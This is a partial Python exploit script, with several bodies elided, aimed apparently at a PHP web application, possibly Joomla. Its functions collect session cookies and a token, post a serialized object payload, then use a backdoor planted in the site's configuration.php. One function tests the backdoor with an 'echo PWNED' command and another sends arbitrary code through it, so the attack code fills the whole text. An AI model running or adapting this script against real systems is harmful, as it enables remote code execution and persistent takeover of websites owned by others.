...
def get_token(url, cook):
	token = ''
	resp = requests.get(url, cookies=cook, proxies = PROXS,verify=False)
...
def get_cook(url):
	resp = requests.get(url, proxies=PROXS,verify=False)
	#print(resp.cookies)
	return resp.cookies
...
def make_req(url , object_payload):
	...
	resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params,verify=False)
	return resp.text
...
def ping_backdoor(url,param_name):
	res = requests.post(url + '/configuration.php', data={param_name:'echo \'PWNED\';'}, proxies = PROXS,verify=False)
...
def execute_backdoor(url, payload_code):
	...
	res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS,verify=False)
	print(res.text)
